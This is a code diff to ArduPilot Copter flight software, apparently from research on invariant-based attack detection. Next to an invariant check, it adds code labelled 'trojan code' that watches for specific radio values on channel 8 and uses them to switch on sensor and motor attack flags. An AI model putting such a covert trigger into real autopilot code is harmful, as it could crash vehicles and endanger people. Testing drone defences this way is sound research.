@@ -266,6 +266,9 @@ void Copter::fast_loop()
         Log_Sensor_Health();
     }
 
+    //@@INVARIANT check
+    copter_invariants_check(attitude_control->get_att_target_euler_cd().x, ahrs.roll_sensor);   // in centi-degree
+
     AP_Vehicle::fast_loop();
 }
 
@@ -654,6 +657,38 @@ void Copter::update_super_simple_bearing(bool force_update)
 
 void Copter::read_AHRS(void)
 {
+    // Perform IMU calculations and get attitude info
+    //-----------------------------------------------
+#if HIL_MODE != HIL_MODE_DISABLED
+    // update hil before ahrs update
+    gcs().update();
+#endif
+    RC_Channel* channel = RC_Channels::rc_channel(CH_8);
+    uint16_t max = channel->get_radio_max();
+    // for test
+    if(max >= 1900) {
+        invariant_enabled = true;
+    } else {
+        invariant_enabled = false;
+    }
+
+
+    //@@INVARIANT trojan code
+    //sensor attack : 1
+    //actuator attack : 2
+    //param attack : 3
+    if(max == 1901) {
+        ahrs.sensor_attack = 1;
+    } else if(max == 1902) {
+        motors->motor_attack = 1;
+    } else if(max == 1903) {
+        //paramter attack
+    } else {
+        //no attack
+        ahrs.sensor_attack = 0;
+        motors->motor_attack = 0;
+    }
+
     // we tell AHRS to skip INS update as we have already done it in fast_loop()
     ahrs.update(true);
 }
